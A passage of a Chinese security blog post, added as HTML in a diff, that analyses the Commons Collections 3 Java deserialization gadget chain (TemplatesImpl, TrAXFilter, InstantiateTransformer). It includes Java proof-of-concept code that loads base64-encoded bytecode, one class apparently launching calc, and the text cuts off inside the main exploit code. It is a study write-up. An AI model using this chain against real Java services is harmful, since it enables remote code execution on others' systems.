@@ -1,0 +1,972 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="3xsh0re">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CC3链：绕过对InvokerTransformer的检测">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC3链分析">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="3xsh0re&#39;Blog">
+<meta property="og:description" content="CC3链：绕过对InvokerTransformer的检测">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929162353200.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190306367.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190458366.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929191231278.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929191044320.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190854030.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929202342171.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929210939550.png">
+<meta property="article:published_time" content="2024-09-29T07:21:05.000Z">
+<meta property="article:modified_time" content="2024-09-29T13:09:40.652Z">
+<meta property="article:author" content="3xsh0re">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929162353200.png">
+  
+  
+  
+  <title>CC3链分析 - 3xsh0re&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"3xsh0re.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"OYnUsPOOxWtnPXQH1Dxz9wjM-gzGzoHsz","app_key":"GoMWtP1iHSKKpwsbzBlVqJ7P","server_url":"https://oynuspoo.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>3xsh0re&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/an1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CC3链分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-29 15:21" pubdate>
+          2024年9月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CC3链分析</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年9月29日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>CC3链：绕过对<code>InvokerTransformer</code>的检测</p>
+<span id="more"></span>
+
+<p>本文主要学习自Java安全漫谈</p>
+<p>起源于<code>InvokerTransformer</code>的CC链自然也会有被写入检测规则的时候，所以需要另辟蹊径</p>
+<p><code>CommonsCollections3</code>并没有使⽤到<code>InvokerTransformer</code>来调⽤任意⽅法，⽽是⽤到了另⼀个 类， <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter </code></p>
+<p>这里不用单独导入pom依赖，在jdk中的<code>rt.jar</code>直接打包了，<code>rt.jar</code>是JAVA基础类库，包含lang在内的大部分功能</p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929162353200.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929162353200">
+
+<p>Java安全漫谈中提出高版本利用构造，所以我这里直接构造高版本的链，jdk版本为1.8.0_92</p>
+<h3 id="TemplatesImpl动态加载类"><a href="#TemplatesImpl动态加载类" class="headerlink" title="TemplatesImpl动态加载类"></a>TemplatesImpl动态加载类</h3><p>在CC1，CC6中，我们最终都是都是通过调用<code>Runtime</code>类来实现命令执行，但是在Java中，提供了一种动态加载类的方法，之前分析过的Log4j2解析漏洞，底层就是通过<code>JNDI</code>支持<code>rmi</code>协议，而<code>rmi</code>协议支持远程加载我们的恶意类，通过<code> URLClassLoader</code>去实现的。</p>
+<p><code>URLClassLoader</code>加载的<code>.class</code>文件，也就是java字节码，</p>
+<p><code>loadClass</code>：作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行<code>findClass</code></p>
+<p><code>findClass</code>：作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给<code>defineClass</code></p>
+<p><code>defineClass</code>：作用是处理前面传入的字节码，将其处理成真正的Java类</p>
+<p>真正核心的部分其实是<code>defineClass</code>，他决定了如何将一段字节流转变成一个Java类，<strong>Java 默认的<code>ClassLoader#defineClass</code>是一个<code>native</code>方法</strong>，逻辑在JVM的C语言代码中</p>
+<p><strong>在 <code>defineClass</code>被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行</strong>。而且，即使我们将初始化代码放在类的static块中，在<code>defineClass</code>时也无法被直接调用到。所以，如果我们要使用 <code>defineClass</code>在目标机器上执行任意代码，需要想办法调用构造函数。</p>
+<p><code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链<code>TemplatesImpl</code>的基石</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>：</p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190306367.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929190306367">
+
+<p>这个类里重写了<code>defineClass</code>方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的<code>defineClass</code>由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用。查看对其调用链：</p>
+<p><code>TransletClassLoader#defineClass()</code></p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190458366.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929190458366">
+
+<p><code>TemplatesImpl#defineTransletClasses()</code></p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929191231278.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929191231278">
+
+<p><code>TemplatesImpl#getTransletInstance()</code></p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929191044320.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929191044320">
+
+<p><code>TemplatesImpl#newTransformer()</code>，到这个函数这里就是public，可以被外部调用了</p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929190854030.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929190854030">
+
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">newTransformer</span><span class="hljs-params">()</span> <br>-&gt; TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">getTransletInstance</span><span class="hljs-params">()</span> <br>-&gt; TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineTransletClasses</span><span class="hljs-params">()</span><br>-&gt; TransletClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineClass</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure>
+
+<p>贴一段测试代码：只需要赋值<code>_bytecodes</code>，<code>_name</code>，<code>_tfactory</code>三个变量即可实现动态加载类实现代码执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    }<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTemplatesImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code =<br>            Base64.getDecoder().decode(<span class="hljs-string">"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA"</span> +<br>                            <span class="hljs-string">"CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP"</span> +<br>                            <span class="hljs-string">"TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0"</span> +<br>                            <span class="hljs-string">"aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm"</span> +<br>                            <span class="hljs-string">"KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y"</span> +<br>                            <span class="hljs-string">"Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw"</span> +<br>                            <span class="hljs-string">"YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp"</span> +<br>                            <span class="hljs-string">"bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb"</span> +<br>                            <span class="hljs-string">"DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB"</span> +<br>                            <span class="hljs-string">"AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj"</span> +<br>                            <span class="hljs-string">"dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z"</span> +<br>                            <span class="hljs-string">"bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry"</span> +<br>                            <span class="hljs-string">"ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n"</span> +<br>                            <span class="hljs-string">"OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA"</span> +<br>                            <span class="hljs-string">"AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA"</span> +<br>                            <span class="hljs-string">"AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA"</span> +<br>                            <span class="hljs-string">"DwABABAAAAACABE="</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] {code});<br>    setFieldValue(obj, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"HelloTemplatesImpl"</span>);<br>    setFieldValue(obj, <span class="hljs-string">"_tfactory"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    obj.newTransformer();<br>}<br></code></pre></td></tr></table></figure>
+
+<p><strong><code>TemplatesImpl</code>中加载的字节码对应的类必须是<code>apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</strong></p>
+<p>但是到这里，突然想到，使用<code>defineClass</code>加载的类无法直接执行，需要调用其构造函数才能执行，那么这个构造函数在哪里调用的，我现在分析一下，看到<code>TemplatesImpl.java</code>中414行的位置，可以看到使用的<code>defineClass</code>会为成员变量<code>_class</code>赋值，也就是动态加载的类被赋值进去了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">_class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure>
+
+<p>然后return，看到451行的位置，这里是调用处</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure>
+
+<p>在它下面455行，就是构造函数触发的地方，这里也说明为什么我们构造的类需要是<code>AbstractTranslet</code>的子类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure>
+
+<p>到这里，使用TemplatesImpl动态加载类就完成了</p>
+<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p>回到<code>TrAXFilter</code>类中，发现其构造函数中会自然调用<code>TemplatesImpl#newTransformer()</code>，那么我们就可以通过构造<code>TrAXFilter</code>一个实例，<strong>调用其构造函数即可实现恶意类加载</strong>，如何实现调用构造函数而又不出现<code>InvokerTransformer</code>，这里引入了一个新的函数，<code>collections.functors.InstantiateTransformer</code>，找到它的<code>transform</code>方法，可以发现这里得到传入参数<code>input</code>的构造器，然后通过传入的<code>iArgs</code>参数去构造实例。</p>
+<img src="/2024/09/29/CC3%E9%93%BE%E5%88%86%E6%9E%90/image-20240929202342171.png" srcset="/img/loading.gif" lazyload class="" title="image-20240929202342171">
+
+<p>现在就考虑<code>iArgs</code>需要哪些，也就是<code>TrAXFilter</code>的构造函数中赋值的属性值，可以发现最重要的就是<code>templates</code>，它属于<code>Templates</code>接口类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>{<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>}<br></code></pre></td></tr></table></figure>
+
+<p>那就去实现一个<code>TemplatesImpl</code>类，刚刚在上面已经实现过了，只需要更换一下base64编码后的字节码。这里的<code>input</code>就是我们的<code>TrAXFilter</code>作为参数传入，在高版本利用情况下，直接将CC6的前半段接上就行了，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">byte</span>[] CalcCode = Base64.getDecoder().decode(<br>            <span class="hljs-string">"yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA"</span> +<br>                    <span class="hljs-string">"CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP"</span> +<br>                    <span class="hljs-string">"TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a"</span> +<br>                    <span class="hljs-string">"W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx"</span> +<br>                    <span class="hljs-string">"jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc"</span> +<br>                    <span class="hljs-string">"GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9"</span> +<br>                    <span class="hljs-string">"4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA"</span> +<br>                    <span class="hljs-string">"ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM"</span> +<br>                    <span class="hljs-string">"MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb"</span> +<br>                    <span class="hljs-string">"HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR"</span> +<br>                    <span class="hljs-string">"lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL"</span> +<br>                    <span class="hljs-string">"2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA"</span> +<br>                    <span class="hljs-string">"nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA"</span> +<br>                    <span class="hljs-string">"AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA"</span> +<br>                    <span class="hljs-string">"ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA"</span> +<br>                    <span 